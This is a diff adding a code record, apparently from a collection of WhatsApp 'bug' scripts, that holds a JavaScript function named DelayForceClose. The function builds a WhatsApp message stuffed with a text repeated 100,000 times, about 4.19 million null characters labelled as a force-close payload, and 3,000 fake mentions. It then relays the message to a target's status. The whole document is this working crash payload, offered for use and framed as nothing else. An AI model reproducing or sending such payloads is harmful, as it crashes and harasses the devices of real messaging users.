@@ -1,0 +1,59 @@
+nama=Pppoponk
+language=javascript
+lines=55
+date=30/11/2025
+code=async function DelayForceClose(target) {
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "DelayForceClose~~~".repeat(100000),
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: `{"force_close": "${"\u0000".repeat(4190000)}" }`, // Payload Force Close
+            version: 3
+          }
+        },
+        contextInfo: {
+          participant: { jid: target },
+          mentionedJid: [
+            "0@s.whatsapp.net",
+            ...Array.from(
+              { length: 3000 },
+              () => "1" + Math.floor(Math.random () *50000000) + "@s.whatsapp.net",
+            ),
+          ],
+        },
+      },
+    },
+  }, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: {
+                  jid: target
+                },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
